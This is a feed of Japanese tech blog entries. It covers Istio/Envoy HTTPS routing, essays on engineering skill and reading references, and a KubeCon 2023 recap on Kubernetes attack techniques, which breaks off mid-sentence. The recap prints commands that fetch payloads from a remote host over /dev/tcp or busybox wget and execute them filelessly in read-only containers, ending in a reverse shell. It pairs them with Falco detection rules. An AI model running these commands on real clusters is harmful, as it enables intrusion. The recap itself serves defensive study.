istio-proxyコンテナのプロキシ先のIPアドレスについてistio-proxyコンテナは、ローカルホストを127.0.0.6とし、HTTPSリクエストをマイクロサービスに送信します。これは、127.0.0.1を指定してしまうと、istio-proxyコンテナからマイクロサービスへの通信がiptables上でループしてしまうためです。istio-proxyコンテナからマイクロサービスへの通信では、正しくはiptables上でISTIO_OUTPUTからPOSTROUTINGに通信を渡します。一方で、もしローカルホストが127.0.0.1であると、ISTIO_OUTPUTからISTIO_IN_REDIRECTに通信を渡すことになり、istio-proxyコンテナに再びリダイレクトしてしまいます。hatappi1225さんの解説が鬼わかりやすかったです\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F画像引用元：mercari engineeringInbound Forwarding - Google ドキュメントiptables から理解する Istio 1.10 から変更された Inbound Forwarding | メルカリエンジニアリングマイクロサービス間のHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50010) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビン、など) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50010) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50010||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50010) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：443) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：istio-egressgateway-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターをIstio EgressGateway 宛先ポートやホストで管理しています (例：outbound|443|istio-egressgateway-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビン、など) に応じて、Istio EgressGateway Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:443) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、Istio EgressGateway PodにL7ロードバランシングします。宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：external.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|443|external.com) 。エンドポイントを選びます。Envoyは、エンドポイントをエントリ済システムのIPアドレスや宛先ポートで管理しています (例：:50010) 。エントリ済システムのIPアドレスは、開発者が設定する必要はなく、EnvoyがDNSから動的に取得します。  エントリ済システムにHTTPSリクエストを送信します。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio07. おわりにIstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのか、またEnvoyがどのようにHTTPSリクエストを処理するのかを解説しました。次々とサービスメッシュツールが登場したとしても、それがEnvoyを使用したサービスメッシュである限り、最終的にはEnvoyの設定値に行き着きます。そのため、抽象化されたEnvoyがどのように通信を扱うのかを一度でも理解すれば、様々なサービスメッシュツールで知識を流用できると思います。Istioはもちろん、他のEnvoyによるサービスメッシュツール (Consul、Cilium、など) を使っている方の参考にもなれば幸いです\uD83D\uDC4D\uD83C\uDFFB謝辞今回、Kubernetesのネットワークを調査するにあたり、以下の方に知見をご教授いただきました。@ken5owata さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/01/16/013404","isoDate":"2024-01-15T16:34:04.000Z","dateMiliSeconds":1705336444000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"スリーシェイク、「AWS アドバンストティアサービスパートナー」に昇格","contentSnippet":"株式会社スリーシェイクは、アマゾン ウェブ サービス（以下、AWS）のAWSパートナーネットワーク（APN）において「AWS アドバンストティアサービスパートナー」に認定されたことをお知らせいたします。The post スリーシェイク、「AWS アドバンストティアサービスパートナー」に昇格 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-advancedtier/","isoDate":"2024-01-12T00:50:00.000Z","dateMiliSeconds":1705020600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"達人と呼ばれる技術力を持ったソフトウェアエンジニアになりたくて","contentSnippet":"zyさんの「技術力が高い」という幻覚を読んでの感想。sizu.me技術力とは私の経験でも、技術力は単なる専門知識や技術の習得を超えた、もっと包括的で深い概念です。実用日本語表現辞典において「技術力」とは、「手段や手法を用いて物事を成し遂げる能力」と定義されています。この定義は、技術を単に適用することではなく、それを利用して広範囲な目標を達成する、特に問題解決能力を含む幅広い能力を示唆しています。言い換えれば、技術力は具体的な技術的スキルだけではなく、それらを応用し、実際の課題に対して実効性のある解決策を生み出す能力を意味します。これには、新しい技術を学び、既存の技術を創造的に応用することも含まれます。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazon技術力への信頼とその重要性私が考えるに、高い技術力は複雑な技術の使用能力だけに限らず、他者からの信頼と依頼を獲得する能力にも反映されます。人々が「あの人に任せたい」「あの人に相談したい」と感じる時、それは技術的な能力だけではなく、人間性やコミュニケーション能力が高いことを示します。こうした能力は、チームワークやプロジェクトの成功に不可欠です。技術力を持つ人は、単にタスクをこなすだけでなく、チームメンバーと効果的に協力し、プロジェクトの目標に貢献します。「技術力が高い」「技術力が低い」という一般的な評価はしばしば狭い視野に基づいています。真の技術力の評価は、直接的な事業貢献やコミュニケーション能力を超えた、より幅広い能力に基づくべきです。これは、個々のポジションや視点によって異なり、難解なコードを書く能力だけでなく、既存のコードを効率的に活用し、迅速に顧客に価値を提供できる能力も含まれます。技術力は、新しい課題に対応する柔軟性と、既存のソリューションを改善する創造性を併せ持つことです。このように、高い技術力は、技術的なスキルに加えて、人間性、信頼性、問題解決能力、コミュニケーション能力などの多面的な資質が組み合わさったものです。これにより、他者から頼りにされ、尊敬されるエンジニアとなることが可能です。心理的安全性のつくりかた　「心理的柔軟性」が困難を乗り越えるチームに変える作者:石井遼介日本能率協会マネジメントセンターAmazonソフトウェアエンジニアの役割ソフトウェアエンジニアは、一人で全てを行う天才ハッカーや家で働きもせずに自称ソフトウェアエンジニアを名乗っている場合を除いて、技術を活用して問題を解決し、新しい価値を創造する重要な役割を担っています。彼らは技術的な問題に直面するだけでなく、企業の一員としてのプロフェッショナルな責任も持ちます。これには、会社の目標達成、業務の効率化、社内外の関係構築など、より広範な責務が含まれます。社内で問題が発生した際、彼らは解決策の策定と推進における主導的な役割を果たし、問題点の指摘にとどまらず、修正パッチの提供など具体的かつ建設的な貢献を行います。この積極的で前向きなアプローチは、問題の根本的な解決につながり、ソフトウェアの品質向上や優れたソリューションの提供に貢献します。総じて、ソフトウェアエンジニアとしての技術力と、企業の一員としてのプロフェッショナルな貢献は、それぞれが重要な役割を果たします。彼らは技術的なスキルと共に、組織内での協力と責任感を兼ね備えていることが求められます。サラリーマン金太郎 第1巻作者:本宮 ひろ志サード・ラインAmazonまとめ私が若い頃、私は寡黙で不器用だが技術に深く向き合う、達人と呼ばれるソフトウェアエンジニアの存在を信じていました。しかし、時が経つにつれて、「技術力が高い」という言葉が単に技術的なスキルの高さだけを意味するのではないことを理解しました。この言葉には、問題解決能力、信頼性、コミュニケーション能力など、多面的な資質が含まれています。たとえそれが誤解や幻想に基づいていたとしても、持ちうる技術力を活かして他者を支援し、互いにリスペクトを持つことが、ソフトウェアエンジニアとしての成長への道であると気づきました。このような姿勢が、周囲から達人として認識されるための重要な要素となっています。イシューからはじめよ――知的生産の「シンプルな本質」作者:安宅和人英治出版Amazonあとは、「技術力が高い」という幻覚を読んでたらそーだいさんのソフトウェアエンジニアと技術力を思い出した。読み返してもとても良かったので合わせて紹介しておきたいです。 speakerdeck.com私、もしくは私たちが技術力と呼んでいるナニカについての話でした。追記したこと後日このブログを読み返してみると、僕にとって、あの日ハッカーに憧れた自分が、「ハッカーの呪縛」から解き放たれるまで 的な意味合いもあったのだと思います。ただの思いつきかもしれませんが、技術分野でトップに立てなかった自分に対する、ある種の弁解や自己正当化の意味もあるのかもしれません。もしかしたらこれから私が歩む道によっては別の意味を持ってくるのか？ハッカーと画家 コンピュータ時代の創造者たち作者:ポール グレアムオーム社Amazonハッカーになろう (How To Become A Hacker）ハッカーと画家 ---Hackers and Painters---","link":"https://syu-m-5151.hatenablog.com/entry/2024/01/10/132326","isoDate":"2024-01-10T04:23:26.000Z","dateMiliSeconds":1704860606000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"k8sgpt-operator 開発メモ (ARM Mac 向け)","contentSnippet":"Kubernetes クラスタ構築 AMD64 コンテナ環境セットアップ ~ Lima VM ~https://github.com/lima-vm/limaGetting Started については README.md 参照Limaでは、事前に定義した内容でVMを作ることができますDocker 環境を構築する場合のサンプルも公開されていますhttps://github.com/lima-vm/lima/blob/master/examples/docker.yaml今回は、amd64 の VM を作成したいため、docker.yaml に以下の行を追記...","link":"https://zenn.dev/tozastation/articles/711f2bff2cc656","isoDate":"2024-01-10T00:17:57.000Z","dateMiliSeconds":1704845877000,"authorName":"tozastation","authorId":"tozastation"},{"title":"PipeCDのインストールとカスタマイズ","contentSnippet":"はじめに はじめまして。Sreake事業部インターン生の荒木です。2023年10月から長期インターン生としてKubernetes関連技術の習得とSRE技術の調査・検証を行っています。 前回の記事では、Kubernetes […]The post PipeCDのインストールとカスタマイズ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pipecd-installation/","isoDate":"2024-01-09T04:09:23.000Z","dateMiliSeconds":1704773363000,"authorName":"Sreake","authorId":"Sreake"},{"title":"PipeCDの概要","contentSnippet":"はじめに はじめまして。Sreake事業部インターン生の荒木です。2023年10月から長期インターン生としてKubernetes関連技術の習得とSRE技術の調査・検証を行っています。 この記事の目的は、Kubernete […]The post PipeCDの概要 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pipecd-overview/","isoDate":"2024-01-09T04:05:16.000Z","dateMiliSeconds":1704773116000,"authorName":"Sreake","authorId":"Sreake"},{"title":"WSL の Linux から Windows のブラウザで URL を開く","contentSnippet":"課題 # WSL の Linux 内で awscli を使って SSO 認証する場合の aws sso login 実行時や GitHub の CLI である gh ( cli.github.com ) コマンドで gh auth login を実行した場合に可能であれば自動でブラウザで指定の URL が開かれますが、","link":"https://blog.1q77.com/2024/01/open-browser-in-wsl/","isoDate":"2024-01-07T11:43:53.000Z","dateMiliSeconds":1704627833000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"技術書やブログ、登壇資料の参考文献は読んだ方がいい","contentSnippet":"はじめに今年、わたしは女性との同棲を解消した。その過程で、円形脱毛症にも胃潰瘍にもなった。まるで自分の身体から生気が抜け落ちるような感覚に何度も襲われた。そして、人生でこれまでにないほど体重が増えるという、加齢を言い訳にしたような出来事が頻発した。彼女との生活でトーストの耳を食べるのをやめていたがそれも食べるように戻した。年末のこの時期は、振り返ったり新しいことを始めたくなるものです。しかしそんなことは全て横に置いておいて今日は、「技術書やブログ、登壇資料の参考文献は読んだ方がいい」というテーマについて、深掘りしてみたいと思います。技術の世界は日々進化し、新しい情報を取り入れることは不可欠ですが、新しい技術や理論の背後にある基礎知識や歴史にも目を向けることも同じかそれ以上に大事ではないでしょうか？参考文献の役割技術書やブログ、登壇資料には、文字やページの数や時間の制限があるため、著者や発表者は主要なポイントに焦点を当てて情報を伝えます。しかしこれらの表面に現れる情報だけでは、トピックの全貌を把握するのは難しいです。そこで重要になるのが、参考文献の役割です。これらは、トピックに関するより詳細な情報、歴史的背景、異なる視点やアプローチを提供し、より深い理解を促します。特に、複雑な技術や理論を扱う際には、参考文献が理解の鍵となります。ブログや登壇資料の表面だけを読んで分かったと思うのは容易いですが、実際の理解は表面的なものに過ぎないことが多いのです。認知科学者スティーブン・スローマンとフィリップ・ファーンバックの著書「知ってるつもり 無知の科学」では、人間の知性の限界と錯覚について詳しく論じられています。この本は、私たちが持つ「知識の錯覚」について解説しています。多くの人が、あるトピックについて理解していると自信を持っているが、実際にはその理解は浅いことが多いのです。これは、私たちの認知システムが複雑な情報を簡略化し、限られた情報から全体を理解したと錯覚する傾向があるためです。知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazonまた、エンジンコミュニティではダニング＝クルーガー効果という現象としても有名で、人々は自分の知識や能力を過大評価する傾向があります。これは特に、自分の知識が不足している分野で顕著に現れます。この効果は、単なる自信過剰にとどまらず、誤った情報や決定に基づく行動を引き起こすリスクを含んでいます。togetter.comこのようなわかったフリした認識の歪みを避けるためにも、参考文献を活用して自分の理解を深め、多角的な視点を持つことが重要です。参考文献は、知識の錯覚やダニング＝クルーガー効果に陥りがちな私たちの認識を補完し、より深い理解を促すためのものになり得ます。文献選びのポイント文献を選ぶ際には、その情報源の信頼性や、著者の専門性を評価することが大切です。現在の自分の知識レベルや興味のある領域に合った文献を選ぶことも重要です。一つのトピックについて、異なる角度から書かれた文献を読むことで、よりバランスの取れた理解が得られます。年末年始の休暇は、新しい知識を身につけるための絶好の機会です。選んだ文献をじっくりと読むことで、より学びを充実させることができます。文献選びに関しては、必ずしも難解なものを選ぶ必要はありません。例えば、参考文献に載ってる書籍の入門書を読むことは、知識の更新や基礎を再確認するためにも有効です。O\'Reillyなどの専門書のサブスクリプションサービスを利用することで、「え、この本読むのに3000円か」と逡巡せずに幅広い分野の知識を得るための良い方法となります。最後にこのブログを通じて伝えたいのは、単に「技術書やブログ、登壇資料の参考文献は読んだ方がいい」というアドバイスではなく、むしろ「技術書やブログ、登壇資料の参考文献は読んでほしい」という切なる願いです。学びの過程で急ぎすぎず、じっくりと時間をかけて考えることは本当に大切です。表面的な理解に留まらず、深く内容を吟味し、背景や著者の意図を理解することで、真の学びが得られます。参考文献を読む際には、それらが提供する多様な視点や深い知識を活用し、幸せの分母を増やすような豊かな理解を目指すことが重要です。ゆっくりと考えることで、新しい発見や洞察が生まれ、学びの経験がより深いものになります。私たちは共に学び、共に成長することができます。皆さん、良いお年をお迎えください。新しい年にも、学びの喜びを共有し、一緒に成長していくことを心から楽しみにしています。そして、みなさんにも心から「参考文献をしっかりと読むこと」を勧めます。それによって、より深い知識と理解を得ることができ、幸せの分母を増やすための一歩となるでしょう。遅考術――じっくりトコトン考え抜くための「１０のレッスン」作者:植原 亮ダイヤモンド社Amazon","link":"https://syu-m-5151.hatenablog.com/entry/2023/12/31/221026","isoDate":"2023-12-31T13:10:26.000Z","dateMiliSeconds":1704028226000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2023年の振り返りをする","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩","link":"https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri","isoDate":"2023-12-31T13:00:10.000Z","dateMiliSeconds":1704027610000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes 編","contentSnippet":"本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\\"$(HOST)\\" == x\\"${PORT}\\" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en \\"GET ${(FILE) HTTP/1.0\\\\r\\\\nHost: $(HOST)\\\\r\\\\n\\\\r\\\\n\\" >&3  (while read line; do  [[ \\"$line\\" == $\'\\\\r\' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo \\"6a295899...60f05\\" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith \\"/dev/shm/\\" or    (proc.cwd startswith \\"/dev/shm/\\" and proc.exe startswith \\"./\\" ) or    (shell_procs and proc.args startswith \\"-c /dev/shm\\") or    (shell_procs and proc.args startswith \\"-i /dev/shm\\") or    (shell_procs and proc.args startswith \\"/dev/shm\\") or    (proc.args contains \\"/dev/shm\\" or proc.cwd startswith \\"/dev/shm\\") or    (proc.cwd startswith \\"/dev/shm/\\" and proc.args startswith \\"./\\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \\"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\\"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \\"3600\\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole 